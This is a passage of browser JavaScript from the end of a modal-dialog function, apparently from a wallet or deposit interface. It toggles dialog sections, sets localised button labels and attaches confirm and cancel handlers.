    poaContainer.classList.remove("hidden");
    document.getElementById("poaBoxText").innerHTML = t.poaBoxHTML;
    document.getElementById("lblPoaSignalText").innerText = t.lblPoaSignalText;
    document.getElementById("poaSignalAmount").innerText = poaSignalText;

  } else if (isPoaChoice) {
    poaChoiceContainer.classList.remove("hidden");
    btnConfirm.classList.add("hidden");

  } else if (hasInput) {
    inputContainer.classList.remove("hidden");
  }

  if (!hasAddressBox && !isDeposit) {
    btnConfirm.innerText = confirmText || t.btnConfirm;
  }
  btnCancel.innerText = t.btnCancel;
  modal.classList.remove("hidden");

  const handleConfirm = () => {
    modal.classList.add("hidden");
    cleanup();
    if (onConfirm) onConfirm(hasInput ? document.getElementById("modalInput").value : true);
  };

  const handleCancel = () => {
    modal.classList.add("hidden");
    cleanup();
    document.getElementById("settingsSection").classList.add("hidden");
    document.getElementById("detailSection").classList.add("hidden");
    document.getElementById("dashboardSection").classList.remove("hidden");
  };

  const cleanup = () => {
    btnConfirm.removeEventListener("click", handleConfirm);
    btnCancel.removeEventListener("click", handleCancel);
  };

  btnConfirm.addEventListener("click", handleConfirm);
  btnCancel.addEventListener("click", handleCancel);
}

applyLanguage();